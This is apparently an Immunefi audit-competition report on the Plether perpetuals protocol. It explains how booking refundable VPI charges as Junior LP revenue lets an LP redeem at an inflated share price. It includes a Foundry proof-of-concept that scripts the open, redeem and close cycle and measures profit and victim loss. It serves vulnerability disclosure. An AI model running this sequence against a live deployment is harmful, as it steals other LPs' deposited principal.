# \#99335 [SC-Critical] Junior share price counts a refundable VPI charge as revenue, letting an LP redeem against its own trade

**Submitted on Nov 13th 2026 at 08:10:21 UTC by @niroh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99335
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Description
Virtual price impact (VPI) is a state potential, not a fee. A trade that increases absolute skew from `S0` to `S1` pays `C(S1) - C(S0)` with `C(S) = k * S^2 / (2 * D)` (`packages/perps/src/CfdMath.sol:118-140`). A trade that reduces skew receives the same difference back. The lifetime clamp in `CloseAccountingLib` caps the amount returned to a position at the amount that position paid:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:107-118
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

A position that opens against a book and closes against the same book therefore gets its whole VPI charge back. While the position is open the charge is a deposit that the pool owes back on unwind.

LP accounting does not treat it that way. On open, the charge is transferred to the pool and recorded as claimant revenue:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:454-463
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

`HousePool.recordClaimantInflow` adds it to `accountedAssets` with no offsetting reserve (`packages/perps/src/HousePool.sol:640-648`). The reconcile snapshot that prices LP shares is physical assets plus the signed terminal price delta minus trader claims, with no VPI term (`packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78`), and every unit above claimed equity is distributed to Junior once Senior is at its high-water mark (`packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:141-159`). Junior redemptions are then funded at `juniorPrincipal / supply` taken immediately after that reconcile (`packages/perps/src/HousePool.sol:835-843`, `:881-888`).

On close, the refund is paid out of pool cash (`packages/perps/src/libraries/CfdEnginePlanLib.sol:973-978`, `packages/perps/src/CfdEngineSettlementSidecar.sol:621-624`), which reduces `accountedAssets` and is absorbed by whoever holds Junior at that time.

The Junior share price is therefore overstated by the outstanding refundable VPI of open positions. An account that holds Junior shares and also controls a trading account can create that overstatement on demand, redeem into it, and then withdraw it:

1. More than five minutes before an epoch boundary, the LP account calls `TrancheVault.requestRedeem` for its Junior shares. The request stays cancellable until the boundary, so nothing is committed.
2. Shortly before the boundary, the trading account opens a skew-increasing position. The VPI charge `c` enters the pool as revenue.
3. At the boundary, `OrderRouter.settleLpEpoch` reconciles and funds the redemption. Junior principal includes `c`; the LP account receives its pro-rata share `f * c` on top of its fair value.
4. The trading account closes. The pool pays `c` back (net of the close execution fee). The LPs that remain bear it.

The only cost is the 4 bps execution fee on each leg. With release parameters (`vpiFactor = 0.01e18`, `maxSkewRatio = 0.4e18`, `executionFeeBps = 4`) a position of 40% of depth pays a VPI charge of 8 bps of depth and 3.2 bps of depth in fees, so the cycle is profitable whenever the redeemed fraction of Junior exceeds 40%. When same-side skew already exists the marginal charge per unit of notional is higher: topping skew from 30% to 40% of depth pays 3.5 bps of depth for 0.8 bps of fees, a break-even near 23%.

No holding period, minimum position lifetime, or VPI-aware share price stands in the way. The one-hour deposit cooldown and the five-minute request cutoff only set the cadence; the attacker re-enters Junior at the post-refund price and repeats.

The same mispricing exists without any attacker trade: any LP can redeem while organic skew is high and re-enter after it unwinds, collecting other traders' refundable charges at the expense of the LPs that stay. The self-dealing sequence makes it deterministic.

The lifetime clamp was added to stop a related LP sandwich (the code comment at `CloseAccountingLib.sol:112-115` describes an attacker who opens at high depth, reduces depth, and closes for a net-negative lifetime VPI). It bounds the refund at the charge paid but does nothing about the LP side of the same sequence, where the profit comes from redeeming shares while the charge is still counted as equity.

### Root cause
A positive VPI charge is recognized as realized LP revenue at open (`CfdEngineSettlementSidecar.executeOpen`, `HousePool.recordClaimantInflow`) although the pool remains liable to refund it on unwind (`CloseAccountingLib.buildCloseState`, lines 107-118). `HousePoolAccountingLib.buildReconcileSnapshot` carries no liability for outstanding positive lifetime VPI, so share pricing in `HousePool._settleLpEpoch` uses an equity figure that includes money owed back to traders.

### Impact
**Critical: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

The funds taken are deposited Junior LP principal held at rest in `HousePool`. After one cycle the remaining Junior LP's redeemable value is below its value in the control run without the attacker's trade (3,991,832.61 USDG against 3,999,780.80 USDG). The difference is received by the redeeming LP and, through execution fees, by the protocol treasury.

The loss is not unclaimed yield. In the flat-book case the only revenue involved is the attacker's own VPI charge, and the attacker recovers that charge in full when the position closes. The amount extracted through the inflated redemption is therefore funded from the other LPs' principal.

### Impact details
Loss of principal for Junior LPs that remain in the tranche, transferred to the redeeming LP and, through execution fees, to the protocol treasury.

Measured on release parameters by the PoC (pool: 15M Senior, 10M Junior of which the attacker holds 6M and one other LP holds 4M; basket at $1.10):

| Scenario | VPI charge | Attacker net | Remaining Junior LP loss |
| --- | --- | --- | --- |
| Flat book, attacker opens 39.9% of depth | 19,901.69 | +3,958.76 | -7,948.19 (19.9 bps of its stake) |
| Same, both fills at the maximum adverse confidence shift (2.5 bps) | 19,891.74 | +461.11 | -4,450.43 |
| Organic skew already 30%, attacker opens 9.9% of depth | 8,650.93 | +3,208.97 | -4,199.51 |
| Three consecutive cycles, flat book | | +11,901.47 | -23,863.86 (59 bps of its stake) |

All amounts are USDG. A cycle takes two to three hours (deposit activation at one boundary, the one-hour cooldown, redemption at a later boundary), so the remaining LPs in this configuration lose on the order of 1.5% of their stake per day while the attack runs. The position is open for about one minute per cycle, so the attacker's price exposure is small and symmetric.

The loss is concentrated on Junior because Junior receives all revenue above the Senior high-water mark. It scales with total pool depth, not Junior size: the charge is 8 bps of depth, so with Senior present the same charge is a larger fraction of Junior principal.


### Code References
- `packages/perps/src/CfdEngineSettlementSidecar.sol:454-463` (VPI charge recorded as claimant revenue on open) and `:621-624` (refund paid from the pool on close)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (share-price equity has no VPI liability)
- `packages/perps/src/libraries/CloseAccountingLib.sol:107-118` (refund on unwind, clamped at the charge paid)

## Proof of Concept

## POC

### How to run
The test file is already in the repository layout below; no other change is needed.

1. Save the code as `packages/perps/test/perps/poc/VpiNavRedemptionExtraction.t.sol`.
2. From the repository root run:

```bash
forge test --root packages/perps --match-path "test/perps/poc/VpiNavRedemptionExtraction.t.sol" -vv
```

Each test runs the same timeline twice from one snapshot, once without the attacker's trade (control) and once with it, and logs both outcomes.

### POC code
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Junior share price counts a trader's refundable virtual-price-impact (VPI) charge as LP revenue.
///
/// A positive VPI charge is transferred to the pool and booked as claimant revenue when a skew-increasing position
/// opens. The same charge is refunded from pool cash when that position closes against the unchanged book (the
/// lifetime clamp caps the refund at the charge paid). The LP share price carries no liability for the pending refund.
///
/// A Junior LP that also controls a trading account can therefore open a skew position immediately before the epoch
/// boundary at which its redemption is funded, redeem at a share price inflated by its own charge, then close and
/// take the charge back from the LPs that remain.
///
/// Both tests run the identical timeline twice from one snapshot: once without the trade (control) and once with it.
contract VpiNavRedemptionExtractionTest is BasePerpTest {

    address private constant VICTIM_LP = address(0xA11CE);
    address private constant ATTACKER_LP = address(0xBAD01);
    address private constant ATTACKER_TRADER = address(0xBAD02);
    address private constant SENIOR_LP = address(0x5E1107);
    address private constant ORGANIC_TRADER = address(0x7EADE5);

    /// @dev Basket deliberately different from $1.00.
    uint256 private constant PRICE = 110_000_000;

    uint256 private constant VICTIM_JUNIOR = 4_000_000e6;
    uint256 private constant ATTACKER_JUNIOR = 6_000_000e6;
    uint256 private constant SENIOR = 15_000_000e6;
    uint256 private constant TRADER_DEPOSIT = 200_000e6;

    struct Outcome {
        uint256 attackerLpAssets;
        uint256 attackerTraderBalance;
        uint256 victimJuniorValue;
        uint256 treasuryBalance;
        uint256 vpiChargePaid;
    }

    /// @dev Release parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // Release Senior limits: 40M absolute, 80% share.
        _setSeniorCapacity(40_000_000e6, 8000);

        _fundJunior(VICTIM_LP, VICTIM_JUNIOR);
        _fundJunior(ATTACKER_LP, ATTACKER_JUNIOR);
        _fundSenior(SENIOR_LP, SENIOR);

        _fundTrader(ATTACKER_TRADER, TRADER_DEPOSIT);
        _fundTrader(ORGANIC_TRADER, TRADER_DEPOSIT);
    }

    function _mark() private {
        uint256 at = block.timestamp;
        uint256 floorTime = uint256(engine.lastMarkTime()) + 1;
        if (at < floorTime) {
            at = floorTime;
            vm.warp(at);
        }
        vm.prank(address(router));
        engine.updateMarkPrice(PRICE, uint64(at));
    }

    function _lots(
        uint256 notionalAssets
    ) private pure returns (uint256) {
        // One lot is 100 tokens; lots * price(8 decimals) is the notional in 6-decimal settlement atoms.
        return notionalAssets / PRICE;
    }

    /// @dev Runs one redemption cycle. `attackNotionalBps` is the attacker position notional in bps of pool depth
    ///      (zero for the control run).
    function _runCycle(
        uint256 attackNotionalBps
    ) private returns (Outcome memory out) {
        return _runCycle(attackNotionalBps, 0);
    }

    /// @dev `adverseShift` models the oracle's side-adverse confidence shift: a LONG opens `adverseShift` below the
    ///      neutral mark and closes `adverseShift` above it, while LP accounting uses the neutral mark.
    function _runCycle(
        uint256 attackNotionalBps,
        uint256 adverseShift
    ) private returns (Outcome memory out) {
        // Start of a fresh epoch, cooldown long elapsed.
        uint256 epochStart = ((block.timestamp / 1 hours) + 3) * 1 hours;
        vm.warp(epochStart + 60);
        _mark();

        // 1. The attacker LP requests redemption of its whole Junior balance for the next boundary.
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);
        uint256 boundary = juniorVault.depositEpochStart(requestId);
        assertEq(boundary, epochStart + 1 hours, "redemption must target the next boundary");

        // 2. Thirty seconds before the boundary the attacker's trading account opens a skew-increasing position.
        vm.warp(boundary - 30);
        _mark();
        uint256 size;
        if (attackNotionalBps != 0) {
            uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
            size = _lots((depth * attackNotionalBps) / 10_000) * CfdTypes.SIZE_QUANTUM;
            uint256 poolBefore = pool.totalAssets();
            _open(ATTACKER_TRADER, CfdTypes.Side.LONG, size, 150_000e6, PRICE - adverseShift);
            out.vpiChargePaid = pool.totalAssets() - poolBefore;
        }

        // 3. The epoch boundary passes and the matured redemption is funded at the current share price.
        vm.warp(boundary + 1);
        _mark();
        _settleLpEpochForTest();

        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
        assertEq(claimableShares, attackerShares, "the whole redemption must be funded at this boundary");
        vm.prank(ATTACKER_LP);
        out.attackerLpAssets = juniorVault.claimRedeem(requestId, claimableShares, ATTACKER_LP, ATTACKER_LP);

        // 4. The attacker closes the position and takes the VPI charge back from the pool.
        if (attackNotionalBps != 0) {
            vm.warp(boundary + 30);
            _mark();
            _close(ATTACKER_TRADER, CfdTypes.Side.LONG, size, PRICE + adverseShift);
        }

        out.attackerTraderBalance = clearinghouse.balanceAssets(ATTACKER_TRADER);
        out.victimJuniorValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP));
        out.treasuryBalance = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _report(
        Outcome memory control,
        Outcome memory attack
    ) private pure returns (int256 attackerNet, uint256 victimLoss) {
        int256 lpGain = int256(attack.attackerLpAssets) - int256(control.attackerLpAssets);
        int256 traderResult = int256(attack.attackerTraderBalance) - int256(control.attackerTraderBalance);
        attackerNet = lpGain + traderResult;
        victimLoss = control.victimJuniorValue - attack.victimJuniorValue;

        console2.log("VPI charge paid into the pool on open (USDG atoms):", attack.vpiChargePaid);
        console2.log("attacker LP redemption, control:", control.attackerLpAssets);
        console2.log("attacker LP redemption, attack: ", attack.attackerLpAssets);
        console2.log("attacker LP gain from inflated share price:", lpGain);
        console2.log("attacker trading account round-trip result:", traderResult);
        console2.log("attacker net profit:", attackerNet);
        console2.log("victim Junior value, control:", control.victimJuniorValue);
        console2.log("victim Junior value, attack: ", attack.victimJuniorValue);
        console2.log("victim loss:", victimLoss);
        console2.log("treasury fee income:", attack.treasuryBalance - control.treasuryBalance);
    }

    /// @notice From a flat book: the attacker holds 60% of Junior and opens 39.9% of depth.
    function test_JuniorLpRedeemsAgainstItsOwnRefundableVpiCharge() public {
        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _runCycle(0);
        vm.revertToState(snapshot);
        Outcome memory attack = _runCycle(3990);

        (int256 attackerNet, uint256 victimLoss) = _report(control, attack);

        assertGt(attack.vpiChargePaid, 0, "the open must pay a positive VPI charge into the pool");
        assertGt(attack.attackerLpAssets, control.attackerLpAssets, "redemption is funded at an inflated share price");
        assertGt(attackerNet, 0, "the cycle must be net profitable for the attacker after all trading costs");
        assertGt(victimLoss, 0, "the remaining Junior LP must bear the refunded charge");
        // The victim funds both the attacker's profit and part of the fees: its loss exceeds the attacker's gain.
        assertGt(victimLoss, uint256(attackerNet), "victim loss must exceed attacker profit");
    }

    /// @notice With organic same-side skew already at 30% of depth the marginal charge per unit of notional is far
    ///         higher, so a 10%-of-depth position is enough.
    function test_ToppingExistingSkewLowersTheBreakEven() public {
        // Organic trader builds 30% skew well before the cycle.
        _mark();
        uint256 depth = pool.totalAssets();
        uint256 organicSize = _lots((depth * 3000) / 10_000) * CfdTypes.SIZE_QUANTUM;
        _open(ORGANIC_TRADER, CfdTypes.Side.LONG, organicSize, 150_000e6, PRICE);

        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _runCycle(0);
        vm.revertToState(snapshot);
        Outcome memory attack = _runCycle(990);

        (int256 attackerNet, uint256 victimLoss) = _report(control, attack);

        assertGt(attackerNet, 0, "topping existing skew must be net profitable");
        assertGt(victimLoss, 0, "the remaining Junior LP must bear the refunded charge");
    }

    /// @notice The cycle stays profitable at the widest oracle confidence the protocol accepts.
    /// @dev `basketMaxConfidenceRatioBps` = 10 and `adverseConfidenceMultiplierBps` = 2,500 bound the side-adverse
    ///      execution shift at 2.5 bps of price per fill. Typical FX confidence is an order of magnitude tighter.
    function test_ProfitSurvivesWorstCaseAdverseConfidenceShift() public {
        uint256 worstCaseShift = (PRICE * 25) / 100_000; // 2.5 bps of the mark

        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _runCycle(0, 0);
        vm.revertToState(snapshot);
        Outcome memory attack = _runCycle(3990, worstCaseShift);

        (int256 attackerNet, uint256 victimLoss) = _report(control, attack);

        assertGt(attackerNet, 0, "profitable even when both fills take the maximum adverse shift");
        assertGt(victimLoss, 0, "the remaining Junior LP still bears the refunded charge");
    }

    /// @notice The extraction repeats: the attacker re-enters Junior at the post-refund share price and runs it again.
    function test_ExtractionRepeatsEveryCycle() public {
        uint256 cycles = 3;

        uint256 snapshot = vm.snapshotState();
        (int256 controlAttacker, uint256 controlVictim) = _runCycles(cycles, 0);
        vm.revertToState(snapshot);
        (int256 attackAttacker, uint256 attackVictim) = _runCycles(cycles, 3990);

        int256 attackerNet = attackAttacker - controlAttacker;
        uint256 victimLoss = controlVictim - attackVictim;
        console2.log("cycles:", cycles);
        console2.log("attacker cumulative net profit:", attackerNet);
        console2.log("victim cumulative loss:", victimLoss);
        console2.log("victim loss in bps of its Junior stake:", (victimLoss * 10_000) / VICTIM_JUNIOR);

        assertGt(attackerNet, 0, "cumulative attacker profit");
        // Each cycle costs the victim roughly 20 bps of its stake in this configuration.
        assertGt(victimLoss, (VICTIM_JUNIOR * 50) / 10_000, "three cycles must cost the victim more than 50 bps");
    }

    /// @dev Returns the attacker's cumulative result (LP proceeds minus LP deposits, plus trading-account change)
    ///      and the victim's final Junior value.
    function _runCycles(
        uint256 cycles,
        uint256 attackNotionalBps
    ) private returns (int256 attackerResult, uint256 victimValue) {
        uint256 traderStart = clearinghouse.balanceAssets(ATTACKER_TRADER);
        uint256 deposited = ATTACKER_JUNIOR;
        for (uint256 i; i < cycles; ++i) {
            Outcome memory out = _runCycle(attackNotionalBps, 0);
            attackerResult += int256(out.attackerLpAssets) - int256(deposited);
            victimValue = out.victimJuniorValue;
            if (i + 1 < cycles) {
                // Re-enter Junior with the same stake at the current (post-refund) share price.
                _mark();
                _fundJunior(ATTACKER_LP, ATTACKER_JUNIOR);
                deposited = ATTACKER_JUNIOR;
            }
        }
        attackerResult += int256(clearinghouse.balanceAssets(ATTACKER_TRADER)) - int256(traderStart);
    }

}
```
